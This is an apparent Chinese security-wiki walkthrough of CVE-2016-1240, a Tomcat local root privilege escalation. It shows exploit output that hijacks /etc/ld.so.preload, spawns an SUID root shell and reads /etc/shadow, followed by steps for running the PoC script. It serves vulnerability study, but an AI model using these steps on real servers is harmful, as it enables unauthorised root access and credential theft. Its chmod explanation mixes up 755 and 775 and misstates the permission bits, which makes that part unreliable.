<span class="n">uid</span><span class="o">=</span><span class="mi">110</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span>

<span class="n">tomcat7</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">$</span><span class="w"> </span><span class="n">lsb_release</span><span class="w"> </span><span class="o">-</span><span class="n">a</span>
<span class="n">No</span><span class="w"> </span><span class="n">LSB</span><span class="w"> </span><span class="n">modules</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">available</span><span class="o">.</span>
<span class="n">Distributor</span><span class="w"> </span><span class="n">ID</span><span class="p">:</span><span class="w">    </span><span class="n">Ubuntu</span>
<span class="n">Description</span><span class="p">:</span><span class="w">    </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">16.04</span><span class="w"> </span><span class="n">LTS</span>
<span class="n">Release</span><span class="p">:</span><span class="w">    </span><span class="mf">16.04</span>
<span class="n">Codename</span><span class="p">:</span><span class="w">    </span><span class="n">xenial</span>

<span class="n">tomcat7</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">$</span><span class="w"> </span><span class="n">dpkg</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">tomcat</span>
<span class="n">ii</span><span class="w">  </span><span class="n">libtomcat7</span><span class="o">-</span><span class="n">java</span><span class="w">              </span><span class="mf">7.0</span><span class="o">.</span><span class="mi">68</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">1</span><span class="w">               </span><span class="n">all</span><span class="w">          </span><span class="n">Servlet</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">JSP</span><span class="w"> </span><span class="n">engine</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">core</span><span class="w"> </span><span class="n">libraries</span>
<span class="n">ii</span><span class="w">  </span><span class="n">tomcat7</span><span class="w">                      </span><span class="mf">7.0</span><span class="o">.</span><span class="mi">68</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">1</span><span class="w">               </span><span class="n">all</span><span class="w">          </span><span class="n">Servlet</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">JSP</span><span class="w"> </span><span class="n">engine</span>
<span class="n">ii</span><span class="w">  </span><span class="n">tomcat7</span><span class="o">-</span><span class="n">common</span><span class="w">               </span><span class="mf">7.0</span><span class="o">.</span><span class="mi">68</span><span class="o">-</span><span class="mi">1</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">1</span><span class="w">               </span><span class="n">all</span><span class="w">          </span><span class="n">Servlet</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">JSP</span><span class="w"> </span><span class="n">engine</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="n">common</span><span class="w"> </span><span class="n">files</span>

<span class="n">tomcat7</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">tomcat</span><span class="o">-</span><span class="n">rootprivesc</span><span class="o">-</span><span class="n">deb</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">tomcat7</span><span class="o">/</span><span class="n">catalina</span><span class="o">.</span><span class="n">out</span>

<span class="n">Tomcat</span><span class="w"> </span><span class="mi">6</span><span class="o">/</span><span class="mi">7</span><span class="o">/</span><span class="mi">8</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">Debian</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">distros</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Local</span><span class="w"> </span><span class="n">Root</span><span class="w"> </span><span class="n">Privilege</span><span class="w"> </span><span class="n">Escalation</span><span class="w"> </span><span class="n">Exploit</span>
<span class="n">CVE</span><span class="o">-</span><span class="mi">2016</span><span class="o">-</span><span class="mi">1240</span>

<span class="n">Discovered</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">coded</span><span class="w"> </span><span class="n">by</span><span class="p">:</span>

<span class="n">Dawid</span><span class="w"> </span><span class="n">Golunski</span>

<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">legalhackers</span><span class="o">.</span><span class="n">com</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Starting</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="p">[</span><span class="n">active</span><span class="p">]</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">privileges</span><span class="p">:</span><span class="w"> </span>
<span class="n">uid</span><span class="o">=</span><span class="mi">110</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Target</span><span class="w"> </span><span class="n">Tomcat</span><span class="w"> </span><span class="nb">log</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">tomcat7</span><span class="o">/</span><span class="n">catalina</span><span class="o">.</span><span class="n">out</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Compiling</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">privesc</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="p">(</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">privesclib</span><span class="o">.</span><span class="n">c</span><span class="p">)</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Backdoor</span><span class="o">/</span><span class="n">low</span><span class="o">-</span><span class="n">priv</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">installed</span><span class="w"> </span><span class="n">at</span><span class="p">:</span><span class="w"> </span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">tomcat7</span><span class="w"> </span><span class="n">tomcat7</span><span class="w"> </span><span class="mi">1037464</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tomcatrootsh</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Symlink</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="n">at</span><span class="p">:</span><span class="w"> </span>
<span class="n">lrwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">tomcat7</span><span class="w"> </span><span class="n">tomcat7</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">tomcat7</span><span class="o">/</span><span class="n">catalina</span><span class="o">.</span><span class="n">out</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="n">preload</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Waiting</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Tomcat</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">re</span><span class="o">-</span><span class="n">open</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">logs</span><span class="o">/</span><span class="n">Tomcat</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">restart</span><span class="o">...</span>
<span class="n">You</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">speed</span><span class="w"> </span><span class="n">things</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">kill</span><span class="w"> </span><span class="p">[</span><span class="n">Tomcat</span><span class="o">-</span><span class="n">pid</span><span class="p">]</span><span class="w"> </span><span class="p">(</span><span class="k">as</span><span class="w"> </span><span class="n">tomcat</span><span class="w"> </span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">needed</span><span class="w"> </span><span class="p">;)</span>


<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Tomcat</span><span class="w"> </span><span class="n">restarted</span><span class="o">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="n">preload</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">got</span><span class="w"> </span><span class="n">created</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">tomcat</span><span class="w"> </span><span class="n">privileges</span><span class="p">:</span><span class="w"> </span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">tomcat7</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">19</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="n">preload</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Adding</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">privesclib</span><span class="o">.</span><span class="n">so</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">lib</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="n">preload</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ld</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="n">preload</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">contains</span><span class="p">:</span><span class="w"> </span>
<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">privesclib</span><span class="o">.</span><span class="n">so</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Escalating</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sudo</span><span class="w"> </span><span class="n">SUID</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">root</span><span class="o">!</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Rootshell</span><span class="w"> </span><span class="n">got</span><span class="w"> </span><span class="n">assigned</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">SUID</span><span class="w"> </span><span class="n">perms</span><span class="w"> </span><span class="n">at</span><span class="p">:</span><span class="w"> </span>
<span class="o">-</span><span class="n">rwsrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1037464</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tomcatrootsh</span>

<span class="n">Please</span><span class="w"> </span><span class="n">tell</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="n">you</span><span class="s1">&#39;re seeing this too ;)</span>


<span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Executing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">rootshell</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">tomcatrootsh</span><span class="w"> </span><span class="n">now</span><span class="o">!</span>

<span class="n">tomcatrootsh</span><span class="o">-</span><span class="mf">4.3</span><span class="c1"># id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">110</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span><span class="w"> </span><span class="n">euid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">118</span><span class="p">(</span><span class="n">tomcat7</span><span class="p">)</span>
<span class="n">tomcatrootsh</span><span class="o">-</span><span class="mf">4.3</span><span class="c1"># whoami</span>
<span class="n">root</span>
<span class="n">tomcatrootsh</span><span class="o">-</span><span class="mf">4.3</span><span class="c1"># head -n3 /etc/shadow</span>
<span class="n">root</span><span class="p">:</span><span class="o">$</span><span class="mi">6</span><span class="o">$</span><span class="n">oaf</span><span class="p">[</span><span class="n">cut</span><span class="p">]:</span><span class="mi">16912</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">daemon</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">16912</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">bin</span><span class="p">:</span><span class="o">*</span><span class="p">:</span><span class="mi">16912</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">99999</span><span class="p">:</span><span class="mi">7</span><span class="p">:::</span>
<span class="n">tomcatrootsh</span><span class="o">-</span><span class="mf">4.3</span><span class="c1"># exit</span>
<span class="n">exit</span>
</code></pre></div>

<p>首先我们下载poc文件，然后执行命令<code>cd /tmp</code>进入目录,然后编辑文件<code>vim poc.sh</code>。将桌面的poc.sh使用Notepad++打开，将文件内容粘贴进去。然后按键盘Esc键，再输入<code>:wq</code>，之后按
Enter 键将文件保存。 如果无法写入文件，使用命令</p>
<div class="codehilite"><pre><span></span><code>chmod 755 poc.sh
</code></pre></div>

<p>执行命令后，再次重复上一步即可，chmod的意思是改变文件的权限，775是什么权限呢？第一个数字代表文件所属者的权限，第二个数字代表文件所属者所在组的权限，第三个数字代表其它用户的权限，7=4+2+1</p>
<blockquote>
<p>4：执行时设置用户ID，用于授权给基于文件属主的进程，而不是给创建此进程的用户。
2：执行时设置用户组ID，用于授权给基于文件所在组的进程，而不是基于创建此进程的用户。
1：设置粘着位。</p>
</blockquote>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId34.gif" /></p>
<p>这时，poc文件就已经构造好了，接下来运行脚本运行命令为：</p>
<div class="codehilite"><pre><span></span><code><span class="o">./</span><span class="n">poc</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">tomcat7</span><span class="o">/</span><span class="n">catalina</span><span class="o">.</span><span class="n">out</span>
</code></pre></div>

<p>运行之后，会出现卡顿现象，这时候我们切换到root用户，重新启动Tomcat7，这时候使用命令<code>whoami</code>查看当前用户，这时候已经是
root 用户了，这时候就提权成功了</p>
<p><img alt="" src="../resource/%28CVE-2016-1240%29Tomcat%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/media/rId35.gif" /></p>
<p>可以看到，命令提示符的开头为<code>tomcat</code>低权限用户，而我们执行whoami命令的时候，显示的权限却是root，这样就成功的提权了。</p>
<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.jianshu.com/p/94e4feac245f">https://www.jianshu.com/p/94e4feac245f</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2016-8735%EF%BC%89Tomcat%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2016-8735%EF%BC%89Tomcat%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2016-8735）Tomcat 反序列化漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" class="btn btn-xs btn-link">
        通过jmx攻击Tomcat
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>